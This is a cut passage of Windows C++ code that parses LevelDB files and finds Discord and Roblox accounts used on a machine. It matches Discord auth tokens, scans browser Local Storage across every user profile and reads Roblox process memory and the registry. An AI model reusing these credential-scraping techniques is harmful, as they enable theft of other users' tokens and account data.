        // Batch header inside record data: seq(8B) + count(4B LE)
        if (recLen < 12) { pos += recLen; continue; }
        size_t bPos = pos;
        size_t bEnd = pos + recLen;
        pos += recLen;
        bPos += 8; // skip sequence number
        uint32_t count = (uint8_t)data[bPos] | ((uint8_t)data[bPos + 1] << 8) |
            ((uint8_t)data[bPos + 2] << 16) | ((uint8_t)data[bPos + 3] << 24);
        bPos += 4;
        if (count > 100000) continue; // sanity

        for (uint32_t i = 0; i < count && bPos < bEnd; ++i) {
            uint8_t tag = (uint8_t)data[bPos++];
            // tag 1 = Put, tag 0 = Delete
            uint64_t kLen = ReadVarint(data, bPos);
            if (kLen == 0 || bPos + kLen > bEnd) break;
            string key(data.begin() + bPos, data.begin() + bPos + kLen);
            bPos += (size_t)kLen;
            if (tag == 1) { // Put
                uint64_t vLen = ReadVarint(data, bPos);
                if (bPos + vLen > bEnd) break;
                string val(data.begin() + bPos, data.begin() + bPos + vLen);
                bPos += (size_t)vLen;
                out.push_back(key);
                out.push_back(val);
            }
        }
    }
}

// Extract all key+value strings from one LevelDB SSTable (.ldb) file.
// Parse one SSTable data block at [blockStart, blockStart+blockSize).
// The block layout: entries using shared-prefix compression, then a restart
// array, then restartCount (4 bytes LE).
// Each entry: [shared varint][nonShared varint][valLen varint][key delta][value]
static void ParseSstBlock(const string& data, size_t blockStart, size_t blockSize,
    vector<string>& out) {
    if (blockStart + blockSize > data.size() || blockSize < 4) return;
    size_t blockEnd = blockStart + blockSize;

    // Last 4 bytes = restart count
    uint32_t restartCount =
        (uint8_t)data[blockEnd - 4] |
        ((uint8_t)data[blockEnd - 3] << 8) |
        ((uint8_t)data[blockEnd - 2] << 16) |
        ((uint8_t)data[blockEnd - 1] << 24);
    if (restartCount == 0 || restartCount > 10000) return;
    if (blockSize < 4 + restartCount * 4) return;
    size_t restartArrayStart = blockEnd - 4 - restartCount * 4;
    if (restartArrayStart <= blockStart) return;

    string sharedKey;
    size_t pos = blockStart;
    int safety = 0;
    while (pos < restartArrayStart && safety++ < 100000) {
        uint64_t shared = ReadVarint(data, pos);
        uint64_t nonShared = ReadVarint(data, pos);
        uint64_t valLen = ReadVarint(data, pos);
        if (shared > sharedKey.size()) break;
        if (nonShared > 512 * 1024 || valLen > 512 * 1024) break;
        if (pos + nonShared + valLen > restartArrayStart) break;

        string key = sharedKey.substr(0, (size_t)shared) +
            string(data.begin() + pos, data.begin() + pos + nonShared);
        pos += (size_t)nonShared;
        string val(data.begin() + pos, data.begin() + pos + valLen);
        pos += (size_t)valLen;

        sharedKey = key;
        out.push_back(key);
        out.push_back(val);
    }
}

static void ParseLevelDbSst(const string& data, vector<string>& out) {
    if (data.size() < 48) return;
    size_t fileSize = data.size();

    // ── LevelDB SSTable on-disk format ───────────────────────────────────────
    // Footer (last 48 bytes):
    //   [metaindex_handle: varint offset + varint size]  (up to 20 bytes)
    //   [index_handle:     varint offset + varint size]  (up to 20 bytes)
    //   [padding to 40 bytes]
    //   [magic: 8 bytes LE = 0xdb4775248b80fb57]
    //
    // Each on-disk block occupies exactly (size + 5) bytes:
    //   [size bytes of block data][1 byte compression][4 bytes CRC32]
    //
    // The index block is itself a data block whose values are BlockHandles
    // (varint offset + varint size) pointing to each data block.
    //
    // Strategy:
    //   Pass 1 — read footer → parse index block → parse every data block exactly.
    //            This is the correct path and works for all well-formed files.
    //   Pass 2 — fallback heuristic sweep if footer/index is unreadable.
    //            Tries scanning every byte offset looking for a valid restart
    //            array signature, so it catches partial/truncated files too.

    static const uint64_t MAGIC = 0xdb4775248b80fb57ULL;

    // Check magic at footer
    size_t footerOff = fileSize - 48;
    uint64_t magic = 0;
    for (int i = 0; i < 8; i++)
        magic |= (uint64_t)(uint8_t)data[footerOff + 40 + i] << (8 * i);

    bool pass1ok = false;
    if (magic == MAGIC) {
        // Read metaindex handle (skip it), then index handle
        size_t fpos = footerOff;
        // Skip metaindex handle (two varints)
        ReadVarint(data, fpos); ReadVarint(data, fpos);
        // Read index handle
        uint64_t idxOff = ReadVarint(data, fpos);
        uint64_t idxSize = ReadVarint(data, fpos);

        if (idxOff + idxSize + 5 <= fileSize && idxSize < fileSize) {
            // Parse the index block to get all data block handles
            vector<string> idxEntries;
            ParseSstBlock(data, (size_t)idxOff, (size_t)idxSize, idxEntries);

            // idxEntries are alternating key/value; values are BlockHandles
            for (size_t i = 1; i < idxEntries.size(); i += 2) {
                const string& handleStr = idxEntries[i];
                size_t hp = 0;
                // Manually read two varints from the handle string
                uint64_t bOff = 0, bSize = 0;
                int shift = 0;
                while (hp < handleStr.size()) {
                    uint8_t b = (uint8_t)handleStr[hp++];
                    bOff |= (uint64_t)(b & 0x7F) << shift;
                    if (!(b & 0x80)) break;
                    shift += 7;
                }
                shift = 0;
                while (hp < handleStr.size()) {
                    uint8_t b = (uint8_t)handleStr[hp++];
                    bSize |= (uint64_t)(b & 0x7F) << shift;
                    if (!(b & 0x80)) break;
                    shift += 7;
                }
                if (bOff + bSize + 5 <= fileSize && bSize > 0 && bSize < fileSize)
                    ParseSstBlock(data, (size_t)bOff, (size_t)bSize, out);
            }
            pass1ok = !out.empty() || !idxEntries.empty();
        }
    }

    if (!pass1ok) {
        // ── Pass 2: heuristic — scan every offset for a plausible block trailer ─
        // Look for positions where the 4 bytes look like a valid small restart count
        // followed immediately by another entry or end-of-block. We try every
        // possible block end position and validate by attempting to parse.
        // This is slow but only runs on files where the footer was unreadable.
        for (size_t candidate = 8; candidate + 4 < fileSize; candidate++) {
            uint32_t rc =
                (uint8_t)data[candidate] |
                ((uint8_t)data[candidate + 1] << 8) |
                ((uint8_t)data[candidate + 2] << 16) |
                ((uint8_t)data[candidate + 3] << 24);
            if (rc == 0 || rc > 128) continue; // restart count sanity
            size_t raSize = 4 + rc * 4; // restart array + count field
            if (candidate < raSize) continue;
            size_t blockEnd = candidate + 4;
            size_t blockStart = 0;
            // Find the start: try stepping back in multiples of typical block sizes
            for (size_t tryStart : { blockEnd > 4096 ? blockEnd - 4096 : (size_t)0,
                blockEnd > 8192 ? blockEnd - 8192 : (size_t)0,
                blockEnd > 2048 ? blockEnd - 2048 : (size_t)0,
                blockEnd > 1024 ? blockEnd - 1024 : (size_t)0 }) {
                if (tryStart >= blockEnd) continue;
                size_t bsz = candidate + 4 - tryStart - raSize;
                if (bsz == 0 || bsz > blockEnd) continue;
                vector<string> tmp;
                ParseSstBlock(data, tryStart, candidate + 4 - tryStart, tmp);
                if (tmp.size() > 2) { // at least 1 key-value pair
                    for (auto& s : tmp) out.push_back(s);
                    blockStart = tryStart;
                    break;
                }
            }
        }
    }
}

// Scan a LevelDB directory, properly parse all .log and .ldb files,
// and return regex capture group 1 matches across all extracted key/value strings.
static vector<string> ScanLevelDbForPattern(const string& ldbDir, const std::regex& rx) {
    vector<string> results;
    std::set<string> seen;

    auto scanStrings = [&](const vector<string>& strings) {
        for (const auto& s : strings) {
            if (s.size() < 3 || s.size() > 4096) continue;
            std::sregex_iterator it(s.begin(), s.end(), rx), end;
            for (; it != end; ++it) {
                string m = (*it)[1].str();
                if (!m.empty() && seen.insert(m).second)
                    results.push_back(m);
            }
        }
        };

    for (const char* ext : { ".log", ".ldb" }) {
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((ldbDir + "\\*" + ext).c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            ULONGLONG fsz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            if (fsz == 0 || fsz > 32ULL * 1024 * 1024) continue;
            HANDLE hf = CreateFileA((ldbDir + "\\" + fd.cFileName).c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hf == INVALID_HANDLE_VALUE) continue;
            string data((size_t)fsz, '\0');
            DWORD rd = 0; ReadFile(hf, &data[0], (DWORD)fsz, &rd, nullptr); CloseHandle(hf);
            data.resize(rd);

            vector<string> strings;
            if (string(ext) == ".log")
                ParseLevelDbLog(data, strings);
            else
                ParseLevelDbSst(data, strings);

            // Fallback: also do the raw scan in case parsing missed anything
            // (e.g. partially corrupted files or unusual block sizes)
            for (char& c : data) if (c == '\0') c = ' ';
            std::sregex_iterator it(data.begin(), data.end(), rx), end;
            for (; it != end; ++it) {
                string m = (*it)[1].str();
                if (!m.empty()) strings.push_back(m); // will dedup in scanStrings
            }

            scanStrings(strings);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    return results;
}

// Scans Discord LevelDB for (id, username) pairs that belong to accounts
// that were actually LOGGED IN on this machine.
//
// The key insight: Discord's LevelDB caches server member lists, DM
// participants, and API responses — all of which contain "id"+"username"
// pairs for random other users.  The only reliable signal that an account
// was *logged in here* is the presence of an auth token stored nearby.
//
// Strategy (mirrors Trinity):
//   Pass 1 — collect all token positions (mfa.xxx... or multi-segment tokens)
//   Pass 2 — collect id/username pairs
//   Pass 3 — for each id/username pair, require a token within TOKEN_WINDOW
//             bytes OR a strong account-ownership context word within
//             CONTEXT_WINDOW bytes.
//
// Falls back to the looser proximity match ONLY if no tokens exist in the
// file at all (e.g. the file pre-dates the login), but in that case the
// proximity window is halved to 250 bytes to reduce noise.
static vector<std::pair<string, string>> ScanLevelDbForDiscordUsers(const string& ldbDir) {
    vector<std::pair<string, string>> results;
    std::set<string> seenIds;

    // Regex patterns
    std::regex idRx("\"id\"\\s*:\\s*\"(\\d{17,19})\"");
    std::regex nameRx("\"username\"\\s*:\\s*\"([^\"\\\\]{1,50})\"");
    // Discord auth token: starts with a base64 user-ID segment (mfa. prefix
    // or plain) followed by two dot-separated segments.  This regex is
    // intentionally broad enough to catch both MFA and normal tokens.
    std::regex tokenRx(
        "(mfa\\.[A-Za-z0-9_\\-]{20,}|"           // MFA token
        "[A-Za-z0-9_\\-]{23,28}\\.[A-Za-z0-9_\\-]{6}\\.[A-Za-z0-9_\\-]{27,})" // normal token
    );
    // Context words that indicate account-ownership rather than member-list data
    // (must appear within CONTEXT_WINDOW bytes of the id/username pair)
    static const vector<string> ownershipCtx = {
        "\"token\"", "\"access_token\"", "\"refresh_token\"",
        "\"currentUser\"", "\"current_user\"",
        "account_manager", "\"accounts\"", "\"analyticsToken\"",
        "\"sessionId\"", "\"session_id\""
    };

    static const size_t TOKEN_WINDOW = 512;   // bytes around id to look for auth token
    static const size_t CONTEXT_WINDOW = 300;   // bytes around id to look for ownership key
    static const size_t LOOSE_WINDOW = 250;   // fallback proximity (no token in file)

    for (const char* ext : { ".ldb", ".log" }) {
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((ldbDir + "\\*" + ext).c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            ULONGLONG fsz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            if (fsz == 0 || fsz > 32ULL * 1024 * 1024) continue;
            HANDLE hf = CreateFileA((ldbDir + "\\" + fd.cFileName).c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hf == INVALID_HANDLE_VALUE) continue;
            string data((size_t)fsz, '\0');
            DWORD rd = 0; ReadFile(hf, &data[0], (DWORD)fsz, &rd, nullptr); CloseHandle(hf);
            data.resize(rd);
            for (char& c : data) if (c == '\0') c = ' ';

            // ── Pass 1: collect token positions ──────────────────────────────
            struct PosVal { size_t pos; string val; };
            vector<PosVal> tokens, ids, names;
            for (auto it = std::sregex_iterator(data.begin(), data.end(), tokenRx);
                it != std::sregex_iterator(); ++it)
                tokens.push_back({ (size_t)it->position(), (*it)[1].str() });

            // ── Pass 2: collect id / username positions ───────────────────────
            for (auto it = std::sregex_iterator(data.begin(), data.end(), idRx);
                it != std::sregex_iterator(); ++it)
                ids.push_back({ (size_t)it->position(), (*it)[1].str() });
            for (auto it = std::sregex_iterator(data.begin(), data.end(), nameRx);
                it != std::sregex_iterator(); ++it)
                names.push_back({ (size_t)it->position(), (*it)[1].str() });

            bool fileHasTokens = !tokens.empty();

            // ── Pass 3: pair ids with usernames, apply ownership filter ───────
            for (auto& idEntry : ids) {
                if (seenIds.count(idEntry.val)) continue;

                // (a) Token proximity check — strongest signal
                bool hasToken = false;
                if (fileHasTokens) {
                    for (auto& tok : tokens) {
                        size_t dist = (tok.pos > idEntry.pos)
                            ? (tok.pos - idEntry.pos)
                            : (idEntry.pos - tok.pos);
                        if (dist <= TOKEN_WINDOW) { hasToken = true; break; }
                    }
                }

                // (b) Ownership context keyword check
                bool hasCtx = false;
                size_t winStart = (idEntry.pos > CONTEXT_WINDOW) ? idEntry.pos - CONTEXT_WINDOW : 0;
                size_t winEnd = std::min(idEntry.pos + CONTEXT_WINDOW, data.size());
                string window = Lower(data.substr(winStart, winEnd - winStart));
                for (auto& ctx : ownershipCtx) {
                    if (window.find(ctx) != string::npos) { hasCtx = true; break; }
                }

                // (c) Fallback: loose proximity when no tokens exist in file
                //     (e.g., older LevelDB record without a stored token)
                bool looseFallback = !fileHasTokens;

                if (!hasToken && !hasCtx && !looseFallback) continue;

                // Find nearest username within the appropriate window
                size_t proximity = hasToken ? TOKEN_WINDOW
                    : (hasCtx ? CONTEXT_WINDOW : LOOSE_WINDOW);
                string bestName; size_t bestDist = proximity + 1;
                for (auto& nm : names) {
                    size_t dist = (nm.pos > idEntry.pos)
                        ? (nm.pos - idEntry.pos)
                        : (idEntry.pos - nm.pos);
                    if (dist < bestDist) { bestDist = dist; bestName = nm.val; }
                }
                if (bestDist > proximity) continue; // no username found nearby

                seenIds.insert(idEntry.val);
                results.push_back({ idEntry.val, bestName });
            }
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    return results;
}

// Returns all Local Storage LevelDB dirs for all Chromium-based browsers
// across every user profile on the machine (requires admin rights).
static vector<string> GetBrowserLevelDbDirs() {
    vector<string> dirs;
    WIN32_FIND_DATAA ufd;
    HANDLE uh = FindFirstFileA("C:\\Users\\*", &ufd);
    if (uh == INVALID_HANDLE_VALUE) return dirs;
    do {
        if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        string uname = ufd.cFileName;
        if (uname == "." || uname == ".." || uname == "Public" ||
            uname == "Default" || uname == "Default User") continue;
        string local = "C:\\Users\\" + uname + "\\AppData\\Local";
        string roaming = "C:\\Users\\" + uname + "\\AppData\\Roaming";
        vector<string> bases = {
            local + "\\Google\\Chrome\\User Data",
            local + "\\Microsoft\\Edge\\User Data",
            local + "\\BraveSoftware\\Brave-Browser\\User Data",
            local + "\\Vivaldi\\User Data",
            roaming + "\\Opera Software\\Opera Stable",
        };
        for (auto& base : bases) {
            DWORD ba = GetFileAttributesA(base.c_str());
            if (ba == INVALID_FILE_ATTRIBUTES || !(ba & FILE_ATTRIBUTE_DIRECTORY)) continue;
            WIN32_FIND_DATAA pfd;
            HANDLE ph = FindFirstFileA((base + "\\*").c_str(), &pfd);
            if (ph == INVALID_HANDLE_VALUE) continue;
            do {
                if (!(pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                string pnLow = Lower(string(pfd.cFileName));
                if (pnLow == "." || pnLow == "..") continue;
                if (pnLow != "default" && pnLow.find("profile") != 0) continue;
                string ldb = base + "\\" + pfd.cFileName + "\\Local Storage\\leveldb";
                DWORD la = GetFileAttributesA(ldb.c_str());
                if (la != INVALID_FILE_ATTRIBUTES && (la & FILE_ATTRIBUTE_DIRECTORY))
                    dirs.push_back(ldb);
            } while (FindNextFileA(ph, &pfd));
            FindClose(ph);
        }
    } while (FindNextFileA(uh, &ufd));
    FindClose(uh);
    return dirs;
}

static vector<string> TrinityGetRobloxIds() {
    // Mirrors Trinity's get_roblox_ids_from_local_storage exactly.
    //
    // Trinity uses the GUAC:(\d{6,12}): key pattern — this is the actual key
    // Roblox writes into LocalStorage for every logged-in account.
    // It scans TWO locations:
    //   1. %LOCALAPPDATA%\Roblox\LocalStorage          (Win32 / classic installer)
    //   2. %LOCALAPPDATA%\Packages\ROBLOXCORPORATION.ROBLOX_*\LocalState\LocalStorage
    //      (Microsoft Store / UWP version)
    // Both are LevelDB dirs scanned with ScanLevelDbForPattern.
    //
    // Additional sources (kept from previous version):
    //   3. Roblox live process memory
    //   4. GlobalSettings XML
    //   5. Registry
    //   6. Roblox logs (username extraction)

    vector<string> ids;
    std::set<string> seenIds;
    auto addId = [&](const string& id) {
        if (id.size() < 3 || id.size() > 13) return;
        for (char c : id) if (!isdigit((unsigned char)c)) return;
        long long v = 0;
        try { v = std::stoll(id); }
        catch (...) { return; }
        if (v < 100) return;
        if (seenIds.insert(id).second) ids.push_back(id);
        };

    // Trinity's primary regex — GUAC:<user_id>: is the actual LocalStorage key
    std::regex guacRx("GUAC:(\\d{6,12}):");
    // Fallback patterns kept for robustness
    std::regex urlRx("roblox\\.com/users/(\\d+)");
    std::regex jsonRx("\"[Uu]serId\"\\s*:\\s*(\\d+)");

    // Helper: scan a LocalStorage LevelDB dir with all patterns
    auto scanLsDir = [&](const string& lsDir, const string& label) {
        DWORD la = GetFileAttributesA(lsDir.c_str());
        if (la == INVALID_FILE_ATTRIBUTES || !(la & FILE_ATTRIBUTE_DIRECTORY)) {
            Log("[DBG] Roblox LocalStorage not found: " + lsDir);
            return;
        }
        Log("[DBG] Roblox LocalStorage found: " + lsDir + "  [" + label + "]");
        auto r0 = ScanLevelDbForPattern(lsDir, guacRx);
        auto r1 = ScanLevelDbForPattern(lsDir, urlRx);
        auto r2 = ScanLevelDbForPattern(lsDir, jsonRx);
        Log("[DBG]   -> GUAC=" + std::to_string(r0.size()) +
            " url=" + std::to_string(r1.size()) +
            " json=" + std::to_string(r2.size()));
        for (auto& id : r0) addId(id);
        for (auto& id : r1) addId(id);
        for (auto& id : r2) addId(id);
        };

    WIN32_FIND_DATAA ufd;
    HANDLE uh = FindFirstFileA("C:\\Users\\*", &ufd);
    if (uh != INVALID_HANDLE_VALUE) {
        do {
            if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            string uname = ufd.cFileName;
            if (uname == "." || uname == ".." || uname == "Public" ||
                uname == "Default" || uname == "Default User") continue;
            string localApp = "C:\\Users\\" + uname + "\\AppData\\Local";

            // ── 1a. Win32 / classic installer ────────────────────────────────
            scanLsDir(localApp + "\\Roblox\\LocalStorage", uname + "@win32");

            // ── 1b. Microsoft Store / UWP (ROBLOXCORPORATION.ROBLOX_*) ───────
            // Trinity scans: %LOCALAPPDATA%\Packages\ROBLOXCORPORATION.ROBLOX_*\LocalState\LocalStorage
            string pkgBase = localApp + "\\Packages";
            WIN32_FIND_DATAA pfd;
            HANDLE ph = FindFirstFileA((pkgBase + "\\ROBLOXCORPORATION.ROBLOX_*").c_str(), &pfd);
            if (ph != INVALID_HANDLE_VALUE) {
                do {
                    if (!(pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                    string pkgDir = pkgBase + "\\" + pfd.cFileName;
                    scanLsDir(pkgDir + "\\LocalState\\LocalStorage", uname + "@msstore");
                    // Also scan LocalState directly for any flat files
                    string lsFlat = pkgDir + "\\LocalState";
                    WIN32_FIND_DATAA ffd;
                    HANDLE fh = FindFirstFileA((lsFlat + "\\*").c_str(), &ffd);
                    if (fh != INVALID_HANDLE_VALUE) {
                        do {
                            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                            string fp = lsFlat + "\\" + ffd.cFileName;
                            HANDLE hf = CreateFileA(fp.c_str(), GENERIC_READ,
                                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                            if (hf == INVALID_HANDLE_VALUE) continue;
                            LARGE_INTEGER fsz = {}; GetFileSizeEx(hf, &fsz);
                            if (fsz.QuadPart > 0 && fsz.QuadPart <= 4 * 1024 * 1024) {
                                string data((size_t)fsz.QuadPart, '\0');
                                DWORD rd = 0; ReadFile(hf, &data[0], (DWORD)fsz.QuadPart, &rd, nullptr);
                                data.resize(rd);
                                for (char& c : data) if (c == '\0') c = ' ';
                                for (auto it = std::sregex_iterator(data.begin(), data.end(), guacRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                                for (auto it = std::sregex_iterator(data.begin(), data.end(), urlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                                for (auto it = std::sregex_iterator(data.begin(), data.end(), jsonRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                            }
                            CloseHandle(hf);
                        } while (FindNextFileA(fh, &ffd));
                        FindClose(fh);
                    }
                } while (FindNextFileA(ph, &pfd));
                FindClose(ph);
            }

            // ── 1c. Flat files in AppData\Local\Roblox\ ──────────────────────
            {
                string robloxDir = localApp + "\\Roblox";
                Log("[DBG] Scanning Roblox dir: " + robloxDir);
                WIN32_FIND_DATAA fd;
                HANDLE h = FindFirstFileA((robloxDir + "\\*").c_str(), &fd);
                if (h != INVALID_HANDLE_VALUE) {
                    do {
                        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                        string fname = Lower(string(fd.cFileName));
                        if (fname.size() < 4) continue;
                        string ext = fname.substr(fname.size() - 4);
                        if (ext == ".exe" || ext == ".dll" || ext == ".msi") continue;
                        string fp = robloxDir + "\\" + fd.cFileName;
                        HANDLE hf = CreateFileA(fp.c_str(), GENERIC_READ,
                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                        if (hf == INVALID_HANDLE_VALUE) continue;
                        LARGE_INTEGER fsz = {}; GetFileSizeEx(hf, &fsz);
                        if (fsz.QuadPart > 0 && fsz.QuadPart <= 4 * 1024 * 1024) {
                            string data((size_t)fsz.QuadPart, '\0');
                            DWORD rd = 0; ReadFile(hf, &data[0], (DWORD)fsz.QuadPart, &rd, nullptr);
                            data.resize(rd);
                            for (char& c : data) if (c == '\0') c = ' ';
                            for (auto it = std::sregex_iterator(data.begin(), data.end(), guacRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                            for (auto it = std::sregex_iterator(data.begin(), data.end(), urlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                            for (auto it = std::sregex_iterator(data.begin(), data.end(), jsonRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                        }
                        CloseHandle(hf);
                    } while (FindNextFileA(h, &fd));
                    FindClose(h);
                }
            }

        } while (FindNextFileA(uh, &ufd));
        FindClose(uh);
    }

    // ── 2. Roblox process memory ──────────────────────────────────────────────
    auto procs = FindRobloxProcesses();
    for (auto& pi : procs) {
        HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pi.pid);
        if (!hp) continue;
        std::regex memIdRx("\"[Uu]ser[Ii]d\"\\s*:\\s*(\\d{6,12})");
        std::regex memProfRx("roblox\\.com/users/(\\d{6,12})/profile");
        std::regex memGuacRx("GUAC:(\\d{6,12}):");
        MEMORY_BASIC_INFORMATION mbi = {};
        LPVOID addr = nullptr;
        while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT &&
                mbi.RegionSize <= 8ULL * 1024 * 1024 &&
                (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                vector<BYTE> buf(mbi.RegionSize);
                SIZE_T br = 0;
                if (ReadProcessMemory(hp, mbi.BaseAddress, buf.data(), mbi.RegionSize, &br) && br > 64) {
                    string chunk(buf.begin(), buf.begin() + br);
                    for (char& c : chunk) if (c == '\0') c = ' ';
                    for (auto it = std::sregex_iterator(chunk.begin(), chunk.end(), memGuacRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                    for (auto it = std::sregex_iterator(chunk.begin(), chunk.end(), memIdRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                    for (auto it = std::sregex_iterator(chunk.begin(), chunk.end(), memProfRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                }
            }
            addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
        }
        CloseHandle(hp);
    }

    // ── 3. GlobalSettings XML ─────────────────────────────────────────────────
    WIN32_FIND_DATAA ufd2;
    HANDLE uh2 = FindFirstFileA("C:\\Users\\*", &ufd2);
    if (uh2 != INVALID_HANDLE_VALUE) {
        do {
            if (!(ufd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            string uname2 = ufd2.cFileName;
            if (uname2 == "." || uname2 == ".." || uname2 == "Public" ||
                uname2 == "Default" || uname2 == "Default User") continue;
            string gsPattern = "C:\\Users\\" + uname2 +
                "\\AppData\\Local\\Roblox\\GlobalSettings_*.xml";
            WIN32_FIND_DATAA gfd;
            HANDLE gh = FindFirstFileA(gsPattern.c_str(), &gfd);
            if (gh != INVALID_HANDLE_VALUE) {
                do {
                    if (gfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    string gfp = "C:\\Users\\" + uname2 + "\\AppData\\Local\\Roblox\\" + gfd.cFileName;
                    HANDLE hf = CreateFileA(gfp.c_str(), GENERIC_READ,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hf == INVALID_HANDLE_VALUE) continue;
                    LARGE_INTEGER fsz2 = {}; GetFileSizeEx(hf, &fsz2);
                    if (fsz2.QuadPart > 0 && fsz2.QuadPart <= 1024 * 1024) {
                        string data2((size_t)fsz2.QuadPart, '\0');
                        DWORD rd2 = 0; ReadFile(hf, &data2[0], (DWORD)fsz2.QuadPart, &rd2, nullptr);
                        data2.resize(rd2);
                        for (auto it = std::sregex_iterator(data2.begin(), data2.end(), guacRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                        for (auto it = std::sregex_iterator(data2.begin(), data2.end(), jsonRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                        for (auto it = std::sregex_iterator(data2.begin(), data2.end(), urlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                    }
                    CloseHandle(hf);
                } while (FindNextFileA(gh, &gfd));
                FindClose(gh);
            }
        } while (FindNextFileA(uh2, &ufd2));
        FindClose(uh2);
    }

    // ── 4. Registry ───────────────────────────────────────────────────────────
    {
        auto scanRobloxRegKey = [&](HKEY root, const char* subkey) {
            HKEY hk;
            if (RegOpenKeyExA(root, subkey, 0, KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hk) != ERROR_SUCCESS) return;
            char valName[16384]; DWORD nameLen; BYTE valData[65536]; DWORD dataLen, type; DWORD idx = 0;
            while (true) {
                nameLen = sizeof(valName); dataLen = sizeof(valData);
                if (RegEnumValueA(hk, idx++, valName, &nameLen, nullptr, &type, valData, &dataLen) != ERROR_SUCCESS) break;
                if (type == REG_SZ || type == REG_MULTI_SZ) {
                    string val((char*)valData);
                    for (auto it = std::sregex_iterator(val.begin(), val.end(), guacRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                    for (auto it = std::sregex_iterator(val.begin(), val.end(), urlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                    for (auto it = std::sregex_iterator(val.begin(), val.end(), jsonRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                }
            }
            DWORD kidx = 0; char subName[256]; DWORD subLen;
            while (true) {
                subLen = sizeof(subName);
                if (RegEnumKeyExA(hk, kidx++, subName, &subLen, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
                HKEY hSub;
                if (RegOpenKeyExA(root, (string(subkey) + "\\" + subName).c_str(), 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
                    DWORD sidx2 = 0;
                    while (true) {
                        nameLen = sizeof(valName); dataLen = sizeof(valData);
                        if (RegEnumValueA(hSub, sidx2++, valName, &nameLen, nullptr, &type, valData, &dataLen) != ERROR_SUCCESS) break;
                        if (type == REG_SZ || type == REG_MULTI_SZ) {
                            string val((char*)valData);
                            for (auto it = std::sregex_iterator(val.begin(), val.end(), guacRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                            for (auto it = std::sregex_iterator(val.begin(), val.end(), urlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                            for (auto it = std::sregex_iterator(val.begin(), val.end(), jsonRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                        }
                    }
                    RegCloseKey(hSub);
                }
            }
            RegCloseKey(hk);
            };
        scanRobloxRegKey(HKEY_CURRENT_USER, "Software\\Roblox");
        scanRobloxRegKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Roblox");
        scanRobloxRegKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Roblox");
    }

    // ── 5. AppStorage.json ────────────────────────────────────────────────────
    // Trinity's get_roblox_ids_from_local_storage reads AppStorage.json directly
    // from the LocalStorage folder. This is a plain JSON file that Roblox writes
    // containing the logged-in userId and other account fields. It's distinct from
    // the LevelDB files scanned above and can survive even after LevelDB is cleared.
    //
    // Path: %LOCALAPPDATA%\Roblox\LocalStorage\AppStorage.json
    // Also check UWP path: %LOCALAPPDATA%\Packages\ROBLOXCORPORATION.ROBLOX_*\LocalState\LocalStorage\AppStorage.json
    {
